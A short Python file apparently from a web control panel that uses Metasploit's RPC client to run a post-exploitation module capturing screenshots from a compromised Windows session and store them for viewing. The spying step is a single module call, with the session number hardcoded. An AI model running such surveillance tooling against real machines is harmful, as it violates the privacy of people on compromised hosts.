from metasploit.msfrpc import MsfRpcClient

import anssi.settings
import os

def post_take_screenshot(client, session, path, count, delay, record, view_screenshots):
    screenshot_path = os.path.join(anssi.settings.MEDIA_ROOT, "screenshots", "screenshot.png")
    print screenshot_path
    post = client.modules.use('post', 'windows/gather/homemade_screen_spy')
    post['SESSION'] = 1
    post['PATH'] = screenshot_path
    post['COUNT'] = count
    post['DELAY'] = delay
    post['RECORD'] = record
    post['VIEW_SCREENSHOTS'] = view_screenshots
    post.execute()


def get_images():
    path = os.path.join(anssi.settings.MEDIA_URL, "screenshots", "screenshot.png")
    images = [ path ]
    return images
